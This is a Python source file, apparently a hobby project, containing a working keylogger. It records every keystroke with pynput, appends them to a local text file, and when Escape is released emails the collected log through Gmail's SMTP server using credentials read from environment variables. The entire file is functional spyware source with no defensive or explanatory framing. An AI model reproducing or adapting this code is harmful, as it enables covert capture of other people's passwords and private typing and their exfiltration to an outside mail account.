import smtplib
import os
from dotenv import load_dotenv
from pynput.keyboard import Key, Listener
from datetime import datetime

load_dotenv()

dt = datetime.now()
ts = datetime.timestamp(dt)
EMAIL_ADDRESS = os.environ.get("emailaddress")
PASSWORD = os.environ.get("password")

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key), dt)

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("output.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:  # Escape to exit
        sendto = EMAIL_ADDRESS
        subject = 'Keylogger Output'

        file_location = "C:\\Users\GGPC\Documents\GitHub\KeyLogger\output.txt"

        with open(file_location) as f:
            message = f.read()

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, PASSWORD)
        text = "Subject: {}\n\n{}".format(subject, message)
        server.sendmail(EMAIL_ADDRESS, sendto, text)

        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
